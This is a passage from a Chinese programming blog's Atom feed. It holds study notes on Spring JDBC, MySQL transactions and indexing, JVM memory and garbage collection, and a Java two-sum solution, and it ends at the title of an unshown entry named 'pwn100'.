class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRowMap</span> <span class="keyword">implements</span> <span class="title">RowMapper</span>&lt;<span class="title">Account</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Account <span class="title">mapRow</span><span class="params">(ResultSet resultSet, <span class="keyword">int</span> i)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        Account account = <span class="keyword">new</span> Account();</span><br><span class="line">        account.setId(resultSet.getInt(<span class="string">"id"</span>));</span><br><span class="line">        account.setName(resultSet.getString(<span class="string">"name"</span>));</span><br><span class="line">        account.setMoney(resultSet.getDouble(<span class="string">"money"</span>));</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>* 编程式事务</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Spring概述&quot;&gt;&lt;a href=&quot;#Spring概述&quot; class=&quot;headerlink&quot; title=&quot;Spring概述&quot;&gt;&lt;/a&gt;Spring概述&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;什么是Spring&lt;ul&gt;
&lt;li&gt;Spring是一个开放源代码的设计层面框架，
      
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="SSH" scheme="http://yoursite.com/tags/SSH/"/>
    
  </entry>
  
  <entry>
    <title>mysql-base</title>
    <link href="http://yoursite.com/2019/09/05/mysql-base/"/>
    <id>http://yoursite.com/2019/09/05/mysql-base/</id>
    <published>2019-09-05T03:36:21.000Z</published>
    <updated>2019-11-03T08:21:15.856Z</updated>
    
    <content type="html"><![CDATA[<ul><li>关系型数据库是以表的形式存储数据，非关系型数据库是以键值对的形式存储数据</li><li><code>Mysql</code>端口号<code>3306</code></li></ul><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h3><ul><li><p>不可分割的操作,假设该操作有ABCD四个步骤组成.</p><p>若ABCD四个步骤都成功完成,则认为事务成功.</p><p>若ABCD中任意一个步骤操作失败,则认为事务失败</p></li><li><p>每条sql语句都是一个事务</p></li><li><p>事务只对DML语句有效,对于DQL无效</p></li></ul><h3 id="事务的ACID"><a href="#事务的ACID" class="headerlink" title="事务的ACID"></a>事务的ACID</h3><ul><li><p>原子性</p><p>　原子性是指事务包含的所有操作要么全部成功，要么全部失败回滚</p></li><li><p>一致性</p><p>一致性是指事务必须使数据库从一个一致性状态变换到另一个一致性状态，也就是说一个事务执行之前和执行之后都必须处于一致性状态。</p><p>让数据保持一定上的合理</p><p>一个商品出库时，仓库商品数量减1，对应用户的购物车中商品加1</p></li><li><p>隔离性</p><p>隔离性是当多个用户并发访问数据库时，比如操作同一张表时，数据库为每一个用户开启的事务，不能被其他事务的操作所干扰，多个并发事务之间要相互隔离。</p></li><li><p>持久性</p><p>持久性是指一个事务一旦被提交了，就不能再回滚了，已经把数据保存到数据库当中了。</p></li></ul><h3 id="事务的使用"><a href="#事务的使用" class="headerlink" title="事务的使用"></a>事务的使用</h3><ul><li><p>开启事务（start transaction）</p></li><li><p>提交事务（commit）</p><p>所有语句全部执行完毕，没有发生异常,提交事务，更新到数据库当中。</p></li><li><p>回滚事务（rollback）</p><p>当遇到一突发情况，撤销执行的sql语句</p></li></ul><h3 id="事务的并发问题"><a href="#事务的并发问题" class="headerlink" title="事务的并发问题"></a>事务的并发问题</h3><ul><li><p>脏读</p><p>访问到了还没有提交的事务所产生的结果</p><p>解决办法：Read committed！读提交，能解决脏读问题</p></li><li><p>不可重复读</p><p>一个事务范围内两个相同的查询却返回了不同数据，这就是不可重复读</p><p>解决办法：Repeatable read</p></li><li><p>重复读：当事务开启时，不允许其他的事务的<code>UPDATA</code>修改操作</p></li><li><p>幻读：事务开启的时候读到一个结果，事务提交又读到一个结果，两者不一样</p></li><li><p>对应关系：</p><table><thead><tr><th align="center">事务隔离级别</th><th align="center">脏读</th><th align="center">不可重复读</th><th align="center">幻读</th></tr></thead><tbody><tr><td align="center">读未提交</td><td align="center">是</td><td align="center">是</td><td align="center">是</td></tr><tr><td align="center">不可重复读</td><td align="center">否</td><td align="center">是</td><td align="center">是</td></tr><tr><td align="center">可重复读</td><td align="center">否</td><td align="center">否</td><td align="center">是</td></tr><tr><td align="center">串行化</td><td align="center">否</td><td align="center">否</td><td align="center">否</td></tr></tbody></table></li></ul><h3 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h3><ul><li>Read uncommitted：就是一个事务可以读取另一个未提交事务的数据</li><li>Read committed：一个事务要等另一个事务提交后才能读取数据</li><li>Repeatable read：就是在开始读取数据（事务开启）时，不再允许修改操作</li><li>Serializable ：在该级别下，事务串行化顺序执行，可以避免脏读、不可重复读与幻读</li></ul><h3 id="查看隔离级别"><a href="#查看隔离级别" class="headerlink" title="查看隔离级别"></a>查看隔离级别</h3><ul><li><code>select @@global.tx_isolation,@@tx_isolation;</code></li></ul><h3 id="设置隔离级别"><a href="#设置隔离级别" class="headerlink" title="设置隔离级别"></a>设置隔离级别</h3><ul><li><p>全局的：</p><p><code>set global transaction isolation level read committed;</code></p></li><li><p>当前会话：</p><p><code>set session transaction isolation level read committed;</code></p></li></ul><h3 id="Mysql性能优化"><a href="#Mysql性能优化" class="headerlink" title="Mysql性能优化"></a>Mysql性能优化</h3><ul><li>数据访问</li></ul><ol><li>只返回必要的列，尽量避免使用<code>select *</code></li><li>只返回必要的行，用limit语句来限制返回的行数</li><li>使用缓存，让经常查询的数据放入缓存中</li><li>使用索引</li></ol><ul><li>重构查询</li></ul><ol><li><p>切分大的查询：一个大查询一次锁住很多数据，阻塞小且重要的数据</p><p>切分前</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">create</span> &lt; data_sub(<span class="keyword">now</span>(),<span class="built_in">interval</span> <span class="number">3</span> <span class="keyword">month</span>);</span><br></pre></td></tr></table></figure><p>切分后</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rows_affected = 0</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">rows_affect = do_query(<span class="string">"delete from table where create &lt; data_sub(now(),interval 3 month)"</span>)</span><br><span class="line">&#125; <span class="keyword">while</span> rows_affected &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>分解大连接查询</p><ul><li>大连接查询分解成对每一个表进行一次单表查询，然后再应用程序进行关联</li><li>这样可以让缓存更加高效，假如连接了多个表，当一个表的缓存失效了，整个表的缓存也会失效</li><li>单表的缓存结果可以被其他表用到，减少冗余</li><li>减少锁的竞争</li><li>在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。 </li><li>查询本身效率也可能会有所提升。</li></ul></li></ol><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><ul><li><p>什么是索引：以表中的一列或者多列，按照某种方式组织起来的数据结构，达到加速查找的目的</p></li><li><p>索引的分类：</p><ol><li><p>根据索引实际的应用分为：普通索引、主键索引、唯一索引、全文索引（可以用于查找文本中的关键词）、联合索引</p></li><li><p>根据实现的数据结构分为：</p><ul><li><p>B树索引：类似二叉搜索树，一个m阶的B树，其子节点最多有m-1个节点，左子树的值都比父节点小，右子树的值都比父节点大，同时子节点的数值大小依次递增。</p></li><li><p>B+树索引：在B树的基础上，对同一层的节点新增指针的顺序访问</p></li><li><p>Hash索引：能以O(1)时间进行查找，但无法用于排序和分组，只支持精确查找，无法用于部分查找和范围查找</p></li><li><p>空间数据索引：基于R-tree的空间数据索引，可以用于地理数据的存储。空间数据索引会从所有的纬度来索引数据，可以有效的使用任意纬度来进行组合查询。缺点是必须使用GIS相关的函数来维护数据。</p></li></ul></li><li><p>根据数据域存储的内容分为：</p><ul><li>主索引：叶子节点的data域记录着完整的数据记录，也称聚簇索引</li><li>辅助索引：叶子节点的data域记录着主键的值，在查找的时候，先找到主键的值，然后再到主索引中进行查找。</li></ul></li></ol></li></ul><h3 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h3><ul><li>索引不能成为表达式的一部分，不能是函数的参数，否则无法使用索引</li><li>再需要使用多个列作为条件进行查询的时候，使用多列索引比使用单个列索引性能更好。</li><li>将选择性最强的索引放在前面，索引的选择性是指不重复的索引值和记录总数的比值，最大为1</li><li>对于Text和Varchar类型的列，必须使用前缀索引，只索引开始的部分字符，对于前缀长度的选取需要根据索引选择性来确定</li><li>索引包含所有需要查询的字段的值</li></ul><h3 id="切分"><a href="#切分" class="headerlink" title="切分"></a>切分</h3><ol><li>水平切分：当一个表的数据不断增多的时候，水平切分可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。<ul><li>策略：哈希取模hash(key)%N</li><li>范围：按照ID范围或者时间范围</li><li>问题：事务问题（使用分布式事务来解决，比如XA接口）、连接问题（可以将原来的连接分成多个单表查询，然后在用户户程序中进行连接）</li></ul></li><li>垂直切分：将一张表按照列分成多个表，通常按照列的关系密集程度或者使用频率切分，比如经常用的列分一起，不常用的列分一起。</li></ol><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><ol><li>主从复制</li></ol><ul><li>一个主服务器，一个从服务器</li><li>binlog线程：主服务器将数据更改写入二进制日志文件（binary log）中</li><li>I/O线程：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（relay log）中。</li><li>SQL线程：负责读取中继日志，解析出主服务器已经执行的数据并在服务器中执行</li></ul><ol start="2"><li><p>读写分离</p><p>主服务器处理写操作以及实时性较高的读操作，而从服务器处理读操作</p><p>优点：</p><ul><li>主从服务器负责各自的读和写，极大程度上缓解了锁的竞争</li><li>从服务器可以使用<code>MyISAM</code>，提升查询的性能以及节约系统开销</li><li>增加冗余，提高可用性</li></ul><p>实现方式：</p><p>通过代理的方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;关系型数据库是以表的形式存储数据，非关系型数据库是以键值对的形式存储数据&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Mysql&lt;/code&gt;端口号&lt;code&gt;3306&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;事务&quot;&gt;&lt;a href=&quot;#事务&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="basic" scheme="http://yoursite.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>javaBasic</title>
    <link href="http://yoursite.com/2019/09/02/javaBasic/"/>
    <id>http://yoursite.com/2019/09/02/javaBasic/</id>
    <published>2019-09-02T10:56:20.000Z</published>
    <updated>2019-11-05T11:54:39.898Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-Package"><a href="#Java-Package" class="headerlink" title="Java Package"></a>Java Package</h2><p>区别类名的命名空间，作用如下</p><ul><li>把功能相似或相关的类或接口组织在同一个包中，方便类的查找和使用。</li><li>如同文件夹一样，包也采用了树形目录的存储方式。同一个包中的类名字是不同的，不同的包中的类的名字是可以相同的，当同时调用两个不同包中相同类名的类时，应该加上包名加以区别。因此，包可以避免名字冲突。</li><li>包也限定了访问权限，拥有包访问权限的类才能访问某个包中的类。Java 使用包（package）这种机制是为了防止命名冲突，访问控制，提供搜索和定位类（class）、接口、枚举（enumerations）和注释（annotation）等。</li></ul><h2 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h2><p>抽象方法只有方法声明，没有方法主体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">xy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//错误</span></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="title">sum</span> <span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口中的属性在不提供修饰符修饰的情况下，会自动加上public static final</p><ul><li><p>属性不能用private，protected,default 修饰，因为默认是public</p></li><li><p>如果属性是基本数据类型，需要赋初始值，若是引用类型，也需要初始化，因为默认有final修饰，必须赋初始值；</p></li><li><p>接口中常规的来说不能够定义方法体，所以无法通过get和set方法获取属性值，所以属性不属于对象，属于类（接口），因为默认使用static修饰。</p></li></ul><h2 id="Java-lang包"><a href="#Java-lang包" class="headerlink" title="Java.lang包"></a>Java.lang包</h2><ul><li>包装类</li><li>String 类</li><li>Math 类     ——    包含函数</li><li>Class 类</li><li>Object 类</li></ul><h2 id="线程销毁"><a href="#线程销毁" class="headerlink" title="线程销毁"></a>线程销毁</h2><p>run()方法的执行结束，start()方法开启一个线程并执行run()方法，start()结束run()不一定结束。start()方法是让线程变成就绪态。</p><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><ul><li><p>JVM内存划分</p><ol><li>方法区：存放已经加载的class信息和static变量、常量等信息，方法区中包含的都是在程序中唯一的元素</li><li>虚拟机栈：执行引擎每次调用一个函数时，就为这个函数创建一个栈帧并将他入栈。</li><li>本地方法区：与虚拟机栈作用相似，但它为native方法服务（native方法是Java调用非Java代码的接口）</li><li>堆：所有线程共享的区域，在虚拟机启动时创建，所有对象实例及数组都在堆上分配。</li><li>程序计数器：每个线程得有个计数器记录当前执行到哪个指令。</li></ol></li><li><p>判断一个对象是否可回收：</p><ol><li><p>引用计数法：为对象添加一个引用计数器，当对象增加一个引用+1，引用失效-1，为0时可以被回收（缺点是无法解决循环引用的问题）</p></li><li><p>可达性分析：以GC Roots为起点进行搜索，可达的对象都是存活的，不可达的对象可以被回收。</p><p>GC Roots可以是：</p><ul><li>虚拟机栈中局部变量比啊中引用的对象</li><li>本地方法栈JNI中引用的对象</li><li>方法去中类静态属性引用的对象</li><li>方法区中常量引用的对象</li></ul></li><li><p>方法区的回收：方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，所以在方法区上进行回收性价比不高，主要是对常量池的回收和对类的卸载。</p></li><li><p>finalize()：类似C++的析构函数，用于关闭外部资源。</p></li></ol></li><li><p>Java的四种强度不同的引用类型</p><ol><li><p>强引用：使用new一个新对象的方式创建</p><p>垃圾回收器绝不会回收它，当内存空间不足时，Java虚拟机宁愿抛出异常使程序终止也不会靠随意回收具有强引用的对象来解决内存不足的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure></li><li><p>软引用：被软引用关联的对象只有在内存不够的情况下才会被回收</p><p>使用 <code>SoftReference</code> 类来创建软引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object(); </span><br><span class="line">SoftReference&lt;Object&gt; sf = <span class="keyword">new</span> SoftReference&lt;Object&gt;(obj); </span><br><span class="line">obj = <span class="keyword">null</span>;  <span class="comment">// 使对象只被软引用关联</span></span><br></pre></td></tr></table></figure></li><li><p>弱引用：被弱引用关联的对象一定会被回收，也就是说他只能存活到下一次垃圾回收发生之前。</p><p>使用 <code>WeakReference</code> 类来创建弱引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object(); </span><br><span class="line">WeakReference&lt;Object&gt; wf = <span class="keyword">new</span> WeakReference&lt;Object&gt;(obj); </span><br><span class="line">obj = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></li><li><p>虚引用：</p><p>又称为幽灵引用或者幻影引用，一个对象是否有虚引用的存在，不会对其生存时间造成影响，也无法通过虚引用得到 一个对象。为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。<br>使用 <code>PhantomReference</code> 来创建虚引用。</p></li></ol></li><li><p>垃圾回收算法</p><ol><li><p>标记-清除</p><p><img src="https://user-images.githubusercontent.com/42031559/68184009-e7e3de00-ffd8-11e9-8ef5-a9dafd96d698.png" alt="image"></p><p>在标记阶段：程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。</p><p>在清除阶段：会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一个空闲分块是否连续，若连续，会合并这两个分块。回收对象就是把对象作为分块，连接到被称为 “空闲链表” 的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。</p><p>不足：</p><p>标记和清除的效率都不高；会产生大量不连续的碎片，导致无法给大对象分配内存。</p></li><li><p>标记-整理</p><p><img src="https://user-images.githubusercontent.com/42031559/68184063-00ec8f00-ffd9-11e9-8092-f3f0089c6504.png" alt="image"></p><p>进行垃圾回收时，让所有存活的对象都向一端移动</p></li><li><p>复制</p><p><img src="https://user-images.githubusercontent.com/42031559/68184091-13ff5f00-ffd9-11e9-80df-2cf300e279bd.png" alt="image"></p><p>将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然 后再把使用过的内存空间进行一次清理。</p><p>不足：内存只使用了一半。</p><p>现代商业虚拟机中将新生代内存分为3块，一块比较大的<code>Eden</code>区，两块比较小的<code>Survivor</code>区，比例为<code>8：1：1</code>每次使用Eden区和其中一块Survivor区，在回收的时候将<code>Eden</code>和<code>Survivor</code>中的存活对象复制到另一块<code>Survivor</code>区上，然后清理<code>Eden</code>和使用过的那一块<code>Survivor</code>区，如果每次回收的对象过多导致另一块Survivor不够用，此时需要依赖老年代进行空间分配担保，也就是借用老年代的空间存储放不下的对象。</p></li><li><p>分代收集</p><p>根据对象存活周期将内存划分为几块，不同的块采用适当的回收算法。</p><p>为了更好得管理堆区域，一般将堆划分为新生代和老年代</p><p>新生代使用：复制算法</p><p>老年代使用：标记-清除、标记-整理算法</p></li></ol></li><li><p>内存分代：</p><ol><li>一个应用启动，操作系统会给他分配一个初始的内存大小，这部分内存大部分应该属于堆内存，JVM 为了更好地利用管理这部分内存，对该区域做了划分，一部分成为新生代，另一部分称为老年代。</li><li>Minor GC：随着对象不断地创建，如果新生代没有空间创建新对象，将会发生的GC。</li><li>Full GC：位于新生代的对象每经过一次Minor GC后，如果这个对象没有被回收，则自己的标记数+1，这个标记标记数用于表示这个对象经历了多少次的Minor GC，次数超过一定后，这个对象才会被移动到老年代，随着时间的推移，如果老年代也没有足够的空间容纳对象，老年代也会试着发生GC，这时候的GC叫做Full GC。</li><li>相比 <code>Minor GC</code>，<code>Full GC</code> 发生的次数比较少，但是每发生一次 <code>Full GC</code>，整个堆内存区域都需要执行一次垃圾回收，这对程序性能造成的影响比 <code>Minor GC</code> 大很多，所以我们应该尽量避免或者减少 <code>Full GC</code> 的发生。同时，在堆内存区域，发生最多的 GC 情形就是新生代的 <code>Minor GC</code> 了，因为所有的对象会优先去新生代开辟空间，所以这块的内存变化会很快，只有内存不够用，就会发生 GC，但是一般的 <code>Minor GC</code>执行比 <code>Full GC</code> 快很多。因为两者使用的算法不同。</li></ol></li><li><p>内存分配策略</p><ol><li><p>对象优先在Eden分配</p><p>大多数情况下，对象在新生代Eden上分配，当Eden空间不足时，发起Minor GC。</p></li><li><p>大对象直接进入老年代</p><p>大对象指的是需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组，经常出现大对象会提前触发垃圾收集器以获取足够的连续空间分配给大对象。</p><p><code>-XX：PretenureSizeThreshold</code>，大于此值的对象直接在老年代分配，避免在Eden和Survivor之间的大量内存复制。</p></li><li><p>动态对象年龄判定</p><p>虚拟机并不是永远要求对象的年龄必须达到<code>MaxTenuringThreshold</code>才能晋升老年代，如果在Survivor中相同年龄所有对象大小的总和大于Survivor空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代。</p></li><li><p>空间分配担保</p><p>在发生<code>Minor GC</code>之前，虚拟机先检查老年代大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的 话，那么<code>Minor GC</code>可以确认是安全的。<br>如果不成立的话虚拟机会查看<code>HandlePromotionFailure</code>的值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 <code>Minor GC</code>如果小 于，或者<code>HandlePromotionFailure</code>的值不允许冒险，那么就要进行一次<code>Full GC</code>。</p></li></ol></li><li><p>Full GC的触发条件</p><ol><li><p>调用System.gc()：</p><p>只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。</p></li><li><p>老年代空间不足：</p><p>老年代空间不足的常见常见为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。</p><p>为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过调整虚拟机参数</p><p><code>-Xmn</code>：虚拟机参数 调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。</p><p><code>-XX:MaxTenuringThreshold</code>：调大对 象进入老年代的年龄，让对象在新生代多存活一段时间。</p></li><li><p>空间分配担保失败：</p><p>使用复制算法的<code>Minor GC</code>需要老年代的内存空间做担保，如果担保失败会执行一次<code>Full GC</code>。</p></li><li><p>JDK 1.7及以前的永久代空间不足</p><p>在 JDK 1.7 及以前，<code>HotSpot</code> 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些<code>Class</code>的信息、常量、静 态变量等数据。<br>当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用<code>CMS GC</code>的情况下也 会执行<code>Full GC</code>。如果经过<code>Full GC</code>仍然回收不了，那么虚拟机会抛出<code>java.lang.OutOfMemoryError</code>。 为避免以上原因引起的<code>Full GC</code>，可采用的方法为增大永久代空间或转为使用<code>CMS GC</code>。</p></li><li><p>Concurrent Mode Failure </p><p>执行<code>CMS GC</code>的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是GC过程中浮动垃圾过多导致暂时性的空间不足），便会报<code>Concurrent Mode Failure</code>错误，并触发 <code>Full GC。</code> </p></li></ol></li></ul><h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><ul><li><p>背景：类是在运行期间第一次使用的时候动态加载的，而不是一次性加载所有的类。因为如果一次性加载，那么会占用很多的内存。</p></li><li><p>类的生命周期：</p><p><img src="https://user-images.githubusercontent.com/42031559/68200464-e2978b00-fffa-11e9-802d-bd615fa6774a.png" alt="image"></p><ol><li><p>加载：</p><ol><li>通过类的完全限定名称获取定义该类的二进制字节流。</li><li>将该字节流表示的静态存储结构转换为方法区的运行时存储结构。</li><li>在内存中生成一个代表该类的Class对象，作为方法区中该类的各种数据的访问入口。</li></ol><p>其中二进制字节流可以从以下方式获取：</p><ol><li>从ZIP包中读取，成为JAR、EAR、WAR格式的基础。</li><li>从网络中获取，最典型的应用是 <code>Applet</code>。</li><li>运行时计算生成，例如动态代理技术，在 <code>java.lang.reﬂect.Proxy</code> 使用 <code>ProxyGenerator.generateProxyClass</code> 的代理类的二进制字节流。 </li><li>由其他文件生成，比如由JSP文件生成对应的Class类。</li></ol></li><li><p>验证：</p><p>确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。</p></li><li><p>准备：</p><p>类变量是被<code>static</code>修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。实例变量不会在这阶段分配内存，它会在对象实例化时随着对象一起被分配在堆中。应该注意到，实例化不是类加载 的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。</p><p>初始值一般为 0 值，例如下面的类变量value被初始化为0而不是123。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> value = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><p>如果类变量是常量，那么它将初始化为表达式所定义的值而不是 0。例如下面的常量 value 被初始化为 123 而不是 0。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> value = <span class="number">123</span>;</span><br></pre></td></tr></table></figure></li></ol></li></ul><h2 id="数组创建的步骤"><a href="#数组创建的步骤" class="headerlink" title="数组创建的步骤"></a>数组创建的步骤</h2><ul><li>声明变量</li><li>在堆中用new关键字初始化数组</li><li>把被初始化的数组的地址赋值给声明的变量</li></ul><h2 id="GC-垃圾回收机制"><a href="#GC-垃圾回收机制" class="headerlink" title="GC:垃圾回收机制"></a>GC:垃圾回收机制</h2><p>程序员不需要再手动的控制内存的释放，当JVM发现内存资源紧张的时候，会自动的清理无用的对象，JVM的垃圾回收机制中，判断一个对象是否死亡，并不是根据是否还有对象对其有引用，而是通过可达性分析。对象之间的引用可以抽象成树形结构，通过树根（GC Root）作为起点，从这些树根向下搜索，搜索过的链称为引用链，当一个对象到GC Root没有任何引用链时，证明这个给对象是不可用的，该对象会被判定为可回收对象。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>基本数据类型：只存放在栈中</li><li>引用数据类型：堆中存放实体，栈中存放地址（new出来的都是引用数据类型）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Java-Package&quot;&gt;&lt;a href=&quot;#Java-Package&quot; class=&quot;headerlink&quot; title=&quot;Java Package&quot;&gt;&lt;/a&gt;Java Package&lt;/h2&gt;&lt;p&gt;区别类名的命名空间，作用如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;把功
      
    
    </summary>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
      <category term="language" scheme="http://yoursite.com/tags/language/"/>
    
  </entry>
  
  <entry>
    <title>algorithm1</title>
    <link href="http://yoursite.com/2019/09/02/algorithm1/"/>
    <id>http://yoursite.com/2019/09/02/algorithm1/</id>
    <published>2019-09-02T10:21:20.000Z</published>
    <updated>2019-09-02T11:26:06.933Z</updated>
    
    <content type="html"><![CDATA[<h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2><ul><li><p>思路:使用一个<code>HashMap</code>，便利数组，每次将互补的数作为<code>key</code>，下标作为<code>value</code>存入<code>HashMap</code>中；并且查看<code>nums[i]</code>是否存在于<code>HashMap</code>中，若存在则获取下标，因为之存在一组结果，所以内外都要返回。</p></li><li><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        HashMap &lt;Integer,Integer&gt; tmpMap = <span class="keyword">new</span> HashMap&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span> index[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmpMap.containsKey(nums[i]))&#123;</span><br><span class="line">                index[<span class="number">0</span>]=i;</span><br><span class="line">                index[<span class="number">1</span>]=tmpMap.get(nums[i]);</span><br><span class="line">                <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">            tmpMap.put(target - nums[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>时间复杂度: O(n)</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;两数之和&quot;&gt;&lt;a href=&quot;#两数之和&quot; class=&quot;headerlink&quot; title=&quot;两数之和&quot;&gt;&lt;/a&gt;两数之和&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;思路:使用一个&lt;code&gt;HashMap&lt;/code&gt;，便利数组，每次将互补的数作为&lt;code&gt;key&lt;/
      
    
    </summary>
    
    
      <category term="algorithm" scheme="http://yoursite.com/tags/algorithm/"/>
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>pwn100</title>
    <link href="http://yoursite.com/2019/08/22/pwn100/"/>
    <id>http://yoursite.com/2019/08/22/pwn100/</id>
